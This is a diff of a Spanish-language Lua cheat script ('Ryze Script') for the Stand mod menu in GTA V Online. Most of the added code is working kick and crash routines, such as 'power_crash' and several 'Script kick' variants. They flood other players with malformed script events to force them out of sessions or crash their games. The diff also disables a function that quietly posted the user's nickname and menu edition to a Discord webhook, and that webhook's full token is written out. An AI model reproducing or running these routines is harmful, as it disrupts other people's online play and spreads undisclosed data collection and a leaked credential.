@@ -6,12 +6,13 @@
 ]]
 
 util.keep_running()
-util.require_natives(1672190175)
+util.require_natives(1676318796)
 
 util.toast("Bienvenidx " .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() .. " Al Script!!")
 util.toast("Cargando, espere... (1-2s)")
 local response = false
-local localVer = 2.17
+local localVer = 2.18
+--local localKs = false
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -33,6 +34,20 @@ async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Sc
         end)
     end
 end, function() response = true end)
+
+--[[
+    async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/KillSwitch.lua", function(output)
+    currentKs = tostring(output)
+    response = true
+    if currentKs == "true" then
+        util.toast("[Ryze Script] El KillSwitch esta activo, cerrando script...")
+        util.yield(2000)
+        util.stop_script()
+    else 
+        util.yield(5)
+    end
+end, function() response = true end)
+]]
 async_http.dispatch()
 repeat 
     util.yield()
@@ -318,15 +333,27 @@ ryze = {
     disable_traffic = true,
     disable_peds = true,
     pwayerp = players.user_ped(),
-    pwayer = players.user_ped(),
+    pwayer = players.user(),
 
-    RyzeWebHook = "api/webhooks/1071866847558914219/N2RM0l2H_o_JyiXX8djzjuyU9l6Km0f6IrtaDi0HD2-lc9yn0DqoJxYSarr-am__Vcsa",
+    --RyzeWebHook = "api/webhooks/1071866847558914219/N2RM0l2H_o_JyiXX8djzjuyU9l6Km0f6IrtaDi0HD2-lc9yn0DqoJxYSarr-am__Vcsa",
 
     maxTimeBetweenPress = 300,
     pressedT = util.current_time_millis(),
+    Int_PTR = memory.alloc_int(),
+    mpChar = util.joaat("mpply_last_mp_char"),
+
+    getMPX = function()
+        STATS.STAT_GET_INT(ryze.mpChar, ryze.Int_PTR, -1)
+        return memory.read_int(ryze.Int_PTR) == 0 and "MP0_" or "MP1_"
+    end,
+
+    STAT_GET_INT = function(Stat)
+        STATS.STAT_GET_INT(util.joaat(ryze.getMPX() .. Stat), ryze.Int_PTR, -1)
+        return memory.read_int(ryze.Int_PTR)
+    end,
 
     getNightclubDailyEarnings = function()
-        local popularity = math.floor(STATS.STAT_GET_INT("CLUB_POPULARITY") / 10)
+        local popularity = math.floor(ryze.STAT_GET_INT("CLUB_POPULARITY") / 10)
         if popularity > 90 then return 10000
         elseif popularity > 85 then return 9000
         elseif popularity > 80 then return 8000
@@ -432,7 +459,31 @@ ryze = {
             end
         end
         util.yield(wait_for)
+    end,
+
+    power_kick = function(player_id)
+        for i, v in pairs(kicks) do
+            arg1 = math.random(-2147483647, 2147483647)
+            arg2 = math.random(-1987543, 1987543)
+            arg3 = math.random(-19, 19)
+            util.trigger_script_event(1 << player_id, {v, pid, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
+            util.yield()
+        end
+        util.toast("Sacaste a " .. PLAYER.GET_PLAYER_NAME(player_id))
+    end,
+
+    power_crash = function(player_id)
+        for i, v in pairs(kicks) do
+            arg1 = math.random(-2147483647, 2147483647)
+            arg2 = math.random(-1987543, 1987543)
+            arg3 = math.random(-19, 19)
+            util.trigger_script_event(1 << player_id, {v, player_id, arg1, arg3, arg2, arg2, arg1, arg1, arg3, arg3, arg1, arg3, arg2, arg3, arg1, arg1, arg2, arg3, arg1, arg2, arg2, arg3, arg3})
+            util.yield()
+        end
+        util.toast("Crasheado a " .. PLAYER.GET_PLAYER_NAME(player_id))
     end
+
+    
 
     --[[
             PapuCrash = function()
@@ -451,7 +502,8 @@ ryze = {
 local KDKkfm = 564191
 -- Local general script functions
 
-function InjectNotification(webhookLink)
+--[[
+    function InjectNotification(webhookLink)
     local PotatoPlayer = players.user()
     local EDITION = menu.get_edition(PotatoPlayer)
     local NameP = players.get_name(PotatoPlayer)
@@ -465,9 +517,9 @@ function InjectNotification(webhookLink)
     async_http.init("discord.com", webhookLink, function () end)
     async_http.set_post("application/json", "{" .. "\"content\":\"" .. tostring(Notification1)  .. tostring(Notification2) .. tostring(Notification3) .. tostring(Notificacion4) .. tostring(Notification5)  .. "\", \"username\":\"" .. "Injection Log" .. "\", \"avatar_url\":\"https://i.imgur.com/zmklcxH.jpeg\"}")
     async_http.dispatch()
-    util.yield(250)
-    util.log("Injection Log Sent")
+    util.yield(150)
 end
+]]
 
 function raycast_gameplay_cam(flag, distance)
     local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
@@ -570,7 +622,7 @@ local function player_toggle_loop(root, player_id, menu_name, command_names, hel
         callback()
     end)
 end
-InjectNotification(ryze.RyzeWebHook)
+--InjectNotification(ryze.RyzeWebHook)
 local function get_blip_coords(blipId)
     local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
     if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
@@ -1557,7 +1609,16 @@ players.on_join(function(player_id)
 
     ]]
 
-    local twotake = menu.list(crashes, "2T1 Crashes", {}, "")
+    local twotake = menu.list(crashes, "Otros Crasheos", {}, "")
+
+    local scrash = menu.list(twotake, "Crasheos Por Scripts", {}, "")
+
+    menu.action(scrash, "Crasheo Poderoso", {}, "", function(on_toggle)
+        menu.trigger_commands("scripthost")
+        util.yield(25)
+        menu.trigger_commands("givesh" .. players.get_name(player_id))
+        ryze.power_crash(player_id)
+    end)
 
     local modelc = menu.list(twotake, "Crasheos Por Modelo", {}, "")
 
@@ -1768,7 +1829,7 @@ players.on_join(function(player_id)
         util.request_model(mdl3)
         util.request_model(mdl4)
         --menu.trigger_commands("anticrashcam")
-        for i = 1, 250 do
+        for i = 1, 20 do
             local ped1 = entities.create_ped(1, mdl, pos, 0)
             local ped_ = entities.create_ped(1, mdl2, pos, 0)
             local ped3 = entities.create_ped(1, mdl3, pos, 0)
@@ -2414,8 +2475,72 @@ players.on_join(function(player_id)
     local sekicks = menu.list(kicks, "Kickeos Por Scripts", {}, "")
 
     menu.action(sekicks, "Script kick v1", {}, "", function()
-        menu.trigger_commands("scripthost")
         util.trigger_script_event(1 << player_id, {1104117595, player_id, 1, 0, 2, math.random(14, 267), 3, 1})
+        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
+        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)}) 
+        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
+        util.trigger_script_event(1 << player_id, {697566862, player_id, 0x4, -1, 1, 1, 1})
+        util.trigger_script_event(1 << player_id, {1268038438, player_id, memory.script_global(2657589 + 1 + (player_id * 466) + 321 + 8)})
+        util.trigger_script_event(1 << player_id, {915462795, players.user(), memory.read_int(memory.script_global(1894573 + 1 + (player_id * 608) + 510))})
+        menu.trigger_commands("givesh" .. players.get_name(player_id))
+    end)
+
+    menu.action(sekicks, "Script kick v2", {}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
+        end
+        menu.trigger_commands("givesh" .. players.get_name(player_id))
+        util.yield()
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, -106354710, 1957299332, 1, 115, 2037557198, -1322654879, -1220141674})
+        end
+    end)
+
+    menu.action(sekicks, "Script kick v3", {}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 5 do
+            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
+        end
+        menu.trigger_commands("givesh" .. players.get_name(player_id))
+        util.yield()
+        for i = 1, 5 do
+            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
+            util.trigger_script_event(1 << player_id, {-168599209, 4, 827588970, 828619960, 1, 115, 330139908, -2089816692, -2142984085})
+            util.yield(300)
+        end
+    end)
+
+    menu.action(sekicks, "Script Kick Poderoso", {}, "", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {1279059857, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {1279059857})
+        end
+        menu.trigger_commands("givesh" .. players.get_name(player_id))
+        util.yield()
+        for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {1279059857, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {1279059857})
+        end
+    end)
+
+    menu.action(sekicks, "Script Kick Poderoso v2", {}, "", function()
+        ryze.power_kick(player_id)
     end)
 
     local especialev = menu.list(malicious, "Eventos Especiales", {}, "Eventos descubiertos recientemente. \nNo abusar de ellos.")
@@ -3392,7 +3517,7 @@ players.on_join(function(player_id)
     end)
 
     menu.toggle(otherc, "Spectear Automatico", {}, "Usara un metodo u otro dependiendo su estado.", function(on)
-        local spec_2 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Ninja Method")
+        local spec_2 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Nuts Method")
         local spec_1 = menu.ref_by_rel_path(menu.player_root(player_id), "Spectate>Legit Method")
         if on then
             if ryze.get_interior_of_player(player_id) == 0 then
@@ -3600,18 +3725,20 @@ end)
 
 menu.toggle_loop(detections, "Teleport", {}, "Detecta si el jugador se teletransporta", function()
     for _, player_id in ipairs(players.list(false, true, true)) do
-        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
-        if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
-            local oldpos = players.get_position(player_id)
-            util.yield(500)
-            local currentpos = players.get_position(player_id)
-            for i, interior in ipairs(interior_stuff) do
-                if v3.distance(oldpos, currentpos) > 300.0 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
-                and ryze.get_interior_player_is_in(player_id) ~= 0 and ryze.get_spawn_state(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
-                    util.toast(players.get_name(player_id) .. " Se acaba de teletransportar")
+        util.create_thread(function()
+            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+            if not NETWORK.NETWORK_IS_PLAYER_FADING(player_id) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped) then
+                local oldpos = players.get_position(player_id)
+                util.yield(500)
+                local currentpos = players.get_position(player_id)
+                for i, interior in ipairs(interior_stuff) do
+                    if v3.distance(oldpos, currentpos) > 300.0 and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
+                    and ryze.get_interior_player_is_in(player_id) ~= 0 and ryze.get_spawn_state(player_id) == interior and PLAYER.IS_PLAYER_PLAYING(player_id) and player.exists(player_id) then
+                        util.toast(players.get_name(player_id) .. " Se acaba de teletransportar")
+                    end
                 end
             end
-        end
+        end)
     end
 end)
 
@@ -3657,14 +3784,14 @@ end, function ()
 end)
 
 menu.toggle_loop(selfc, "Sin animacion", {}, "Cambias de arma rapido.", function()
-    if TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 56) then
-        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(ryze.pwayerp)
+    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
+        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
     end
-    if TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 92) then
-        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(ryze.pwayerp)
+    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
+        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
     end
-    if (TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 160) or TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 167) or TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 165)) and not TASK.GET_IS_TASK_ACTIVE(ryze.pwayerp, 195) then
-        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(ryze.pwayerp)
+    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
+        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
     end
 end)
 
@@ -3676,7 +3803,7 @@ menu.toggle_loop(selfc, "Respawn Rapido", {}, "Quitara la pantalla de carga.", f
     end
 end)
 
-local s_forcefield_range = 10
+local s_forcefield_range = 25
 local s_forcefield = 0
 local s_forcefield_names = {
     [0] = "Push",
@@ -3904,7 +4031,7 @@ recovery = menu.list(online, "Recovery", {}, "", function()
 end)
 
 
-local coleccionables = menu.list(recovery, "Coleccionables 'RISKY'", {}, "")
+local coleccionables = menu.list(recovery, "Coleccionables", {}, "")
 
 menu.click_slider(coleccionables, "Cintas", {""}, "", 0, 9, 0, 1, function(i)
     util.trigger_script_event(1 << players.user(), {1839167950, players.user(), 0x0, i, 1, 1, 1})
@@ -3951,22 +4078,6 @@ menu.click_slider(coleccionables, "Junk Energy Vuelo Libre", {""}, "", 0, 9, 0, 
 end)
 
 local drugwars = menu.list(recovery, "Drug Wars", {}, "Contenido de DrugWars.")
-
-menu.action(drugwars, "Desbloquear Garage", {}, "Desbloqueara el nuevo garage temporalmente. \nSe borrara al cambiar la sesion.", function()
-    util.toast("Iniciando proceso.")
-    util.toast("Tarda 2s aprox.")
-    local player = PLAYER.PLAYER_PED_ID()
-    ENTITY.SET_ENTITY_COORDS(player, -285.96716, 273.57812, 89.13905, 1, false)
-    util.yield(1000)
-    memory.write_byte(memory.script_global(262145 + 32702), 1)
-    memory.write_byte(memory.script_global(262145 + 32688), 0)
-    util.toast("Terminado, deberias poder entrar o comprarlo.")
-end)
-
-menu.action(drugwars, "Desbloquear Cont/Navidad", {}, "Despues de cambiar de sesion se te desbloqueara el contenido de navidad.", function()
-    memory.write_byte(memory.script_global(262145 + 33915), 1)  
-    memory.write_byte(memory.script_global(262145 + 33916), 1)  
-end)
 
 menu.action(drugwars, "Desbloquear Cont/DLC", {}, "Te desbloqueara el contenido del nuevo DLC \nProbablemente sea solo por la sesion.", function()
     menu.trigger_commands("scripthost")
@@ -4263,6 +4374,16 @@ menu.action(quitarf, "Quitar Freeze V2 'Test'", {}, "Intenta reiniciar algunos n
     menu.trigger_commands("rcleararea")
 end)
 
+menu.toggle_loop(protects, "Bloquear Clones", {}, "Bloqueara los clones que te intenten spawnear.", function()
+    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
+    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
+        util.toast("Clon detectado. Borrando")
+        entities.delete_by_handle(ped)
+        util.yield(150)
+        end
+    end
+end)
+
 menu.toggle(protects, "Modo Panico", {"panic"}, "Esto renderiza un modo de anti-crash quitando todo tipo de evento del juego a toda costa.", function(on_toggle)
     local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
     local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
@@ -4551,22 +4672,23 @@ end)
 
 --------------------------------------------------------------------------------------------------------------------------------
 -- Coches
-my_cur_car = entities.get_user_vehicle_as_handle()
+
 menu.toggle_loop(vehicles, "SpiderMan 'Test'", {}, "Forzara tu vehiculo al suelo \nTendras que pegarte a un edifico primero.", function()
-    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ryze.my_cur_car)
+    local my_cur_car = entities.get_user_vehicle_as_handle()
+    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(my_cur_car)
     util.yield(50)
-    ENTITY.APPLY_FORCE_TO_ENTITY(ryze.my_cur_car, 1, 0, 0, -1, 0, 0, 0.5, 0, false, false, true)
+    ENTITY.APPLY_FORCE_TO_ENTITY(my_cur_car, 1, 0, 0, - 1.5, 0, 0, 0.5, 0, false, false, true)
 end)
 
 menu.toggle_loop(vehicles, "Salto Vehicular 'Test'", {}, "Podras saltar con el carro cliqueando 2 veces rapidamente la \"W\"", function()
-    if VEHICLE.GET_PED_IN_VEHICLE_SEAT(ryze.my_cur_car, -1, false) == PLAYER.PLAYER_PED_ID() and PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), ryze.my_cur_car, true) then
+    if VEHICLE.GET_PED_IN_VEHICLE_SEAT(my_cur_car, -1, false) == PLAYER.PLAYER_PED_ID() and PED.IS_PED_IN_VEHICLE(PLAYER.PLAYER_PED_ID(), my_cur_car, true) then
         if PAD.IS_CONTROL_JUST_PRESSED(32, 32) then
             if not (util.current_time_millis() - ryze.pressedT <= ryze.maxTimeBetweenPress) then
                 ryze.pressedT = util.current_time_millis()
                 return
             end
-            local mySpeed = ENTITY.GET_ENTITY_SPEED(ryze.my_cur_car)
-            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(ryze.my_cur_car, 1, 0, 2, (mySpeed / 10) + 14, 0, true, true, true)
+            local mySpeed = ENTITY.GET_ENTITY_SPEED(my_cur_car)
+            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(my_cur_car, 1, 0, 2, (mySpeed / 10) + 14, 0, true, true, true)
             AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hydraulics_Down", PLAYER.PLAYER_PED_ID(), "Lowrider_Super_Mod_Garage_Sounds", true, 20)
         end
     end
